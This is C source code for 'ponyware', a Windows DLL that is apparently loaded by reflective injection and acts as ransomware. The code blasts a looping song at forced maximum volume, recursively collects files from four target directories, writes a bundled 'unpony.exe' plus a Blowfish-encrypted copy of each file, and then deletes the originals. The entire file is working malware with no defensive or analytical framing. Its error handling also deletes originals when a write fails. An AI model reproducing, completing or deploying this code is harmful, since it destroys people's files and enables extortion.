#include "ponywareDll.h"

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) 
{	
	BOOL bReturnValue = TRUE;	

	switch (dwReason) {

		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;

		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			PonyMane();
			break;

		case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
			break;
	}

	return bReturnValue;
}

/* the pony's mane function that runs all the code */
BOOL PonyMane(void) {

	HANDLE volumeMaxThread = NULL;

	// start thread to keep volume at max for pony song
	setVolumeToMax();

	// start the pony song
	singPonies();

	// encrypt files and add unpony PE to header of encrypted file
	ransomWithPonies();

	// infinite wait
	while(TRUE) {
		setVolumeToMax();
		Sleep(1000);
	}

	// we never get here
	return TRUE;
}

/* set volume to maximum */
void setVolumeToMax() {

	// if Windows OS version is prior to Windows Vista
	if (getWindowsOSVersion() < 600) {	
		setVolumeXP(0xFFFF);
	}
	// if Windows Vista or newer
	else {
		setVolumeVista(1.0);
	}
}

/* plays the mlp16.wav resource on a loop */
void singPonies() {

	HRSRC hResource    = NULL;
	HGLOBAL hResData   = NULL;
	LPVOID  lpResource = NULL;
	
	// find wave resource
	hResource = FindResource(hAppInstance, MAKEINTRESOURCE(IDR_WAVE1), L"WAVE");
	if (!hResource) {
		return;
	}
	
	// load wave resource
	hResData = LoadResource(hAppInstance, hResource);
	if (!hResData) {
		return;
	}

	// retrieve pointer to resource
	lpResource = LockResource(hResData);
	if (!lpResource) {
		FreeResource(hResData);
		return;
	}

	// play wave on a loop
	sndPlaySound((LPCWSTR)lpResource, SND_MEMORY | SND_LOOP | SND_ASYNC | SND_NODEFAULT);
}

/* encrypt files and add unpony PE to header of encrypted file */
void ransomWithPonies() {
	TCHAR targetDirEx01[MAX_PATH + 1] = {0};
	TCHAR targetDirEx02[MAX_PATH + 1] = {0};
	TCHAR targetDirEx03[MAX_PATH + 1] = {0};
	TCHAR targetDirEx04[MAX_PATH + 1] = {0};
	stringList fl = {0};
	TCHAR *filename = NULL;
	TCHAR *strToCompare = NULL;
	TCHAR *newfilename = NULL;
	size_t newfilelen = 0;
	TCHAR *tmpfilename = NULL;
	HANDLE infile = NULL;
	HANDLE outfile = NULL;
	HGLOBAL hResData = NULL;
	LPVOID lpResource = NULL;
	DWORD resourceSize = 0;
	DWORD dwBytesWritten = 0;
	const char *result = NULL;

	// initialize string list
	initStringList(&fl);

	// targetDir01
	// expand Windows environment strings in target directory
	if (ExpandEnvironmentStrings(targetDir01, targetDirEx01, MAX_PATH)) {
		// build recursive list of files in target directory
		recursiveDirList(targetDirEx01, &fl);
	}

	// targetDir02
	// expand Windows environment strings in target directory
	if (ExpandEnvironmentStrings(targetDir02, targetDirEx02, MAX_PATH)) {
		// build recursive list of files in target directory
		recursiveDirList(targetDirEx02, &fl);
	}

	// targetDir03
	// expand Windows environment strings in target directory
	if (ExpandEnvironmentStrings(targetDir03, targetDirEx03, MAX_PATH)) {
		// build recursive list of files in target directory
		recursiveDirList(targetDirEx03, &fl);
	}

	// targetDir04
	// expand Windows environment strings in target directory
	if (ExpandEnvironmentStrings(targetDir04, targetDirEx04, MAX_PATH)) {
		// build recursive list of files in target directory
		recursiveDirList(targetDirEx04, &fl);
	}

	// get pointer to unpony.exe resource
	if (!getPointerToResource(hAppInstance, IDR_EXE1, RT_RCDATA, &hResData, &lpResource, &resourceSize)) {
		fl.destroy(&fl);
		return;
	}
	
	// while files in file list
	while (fl.length != 0) {
		filename = fl.pop(&fl);

		// keep volume set to max
		setVolumeToMax();

		// check that filename isn't paythepony.exe, ponyware32.dll, or ponyware64.dll
		if (wcslen(filename) >= SELF_FILENAME_LENGTH) {
			// grab last SELF_FILENAME_LENGTH characters of string
			strToCompare = filename + wcslen(filename) - SELF_FILENAME_LENGTH;
			// compare string
			if (wcsncmp(launcher, strToCompare, SELF_FILENAME_LENGTH) == 0) {
				free(filename);
				continue;
			}
			else if (wcsncmp(myDll32, strToCompare, SELF_FILENAME_LENGTH) == 0) {
				free(filename);
				continue;
			}
			else if (wcsncmp(myDll64, strToCompare, SELF_FILENAME_LENGTH) == 0) {
				free(filename);
				continue;
			}
		}
		
		// open file.ext with no sharing / exclusive
		infile = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		// file successfully opened
		if (infile != INVALID_HANDLE_VALUE) {

			// create filename to write encrypted data into
			tmpfilename = (TCHAR *)calloc(wcslen(filename) + 1, sizeof(TCHAR));
			wcscpy_s(tmpfilename, wcslen(filename) + 1, filename);

			do {
				// create file.ext.exe string
				newfilelen = wcslen(tmpfilename) + wcslen(encryptedFileExt) + 1;
				newfilename = (TCHAR *)calloc(newfilelen, sizeof(TCHAR));
				wcscat_s(newfilename, newfilelen, tmpfilename);
				wcscat_s(newfilename, newfilelen, encryptedFileExt);
				free(tmpfilename);
			
				// create outfile
				outfile = CreateFile(newfilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
				tmpfilename = newfilename;
			} while (outfile == INVALID_HANDLE_VALUE);

			// write unpony.exe into file.ext.exe
			if(!WriteFile(outfile, lpResource, resourceSize, &dwBytesWritten, NULL) || dwBytesWritten != resourceSize) {
				result = NULL;
			}
			else {
				// read infile and write encrypted (using password) infile into outfile
				result = encryptFile_blowfish(infile, outfile, (unsigned char *)encryptFilePass);
			}

			// close file handles
			CloseHandle(outfile);
			CloseHandle(infile);

			// delete infile if encrypted successfully
			if (result == NULL) {
				SetFileAttributes(filename, FILE_ATTRIBUTE_NORMAL);
				DeleteFile(filename);
			}
			// delete outfile if error
			else {
				DeleteFile(newfilename);
			}
				
			free(tmpfilename);		
		}

		// failed to open file
		else {
			// file no longer exists
			if (GetLastError() == ERROR_FILE_NOT_FOUND) {
				free(filename);
				continue;
			}

			// add file back to list
			fl.append(&fl, filename);
		}

		free(filename);
	} // end of file list while loop

	// cleanup
	FreeResource(hResData);
	fl.destroy(&fl);
}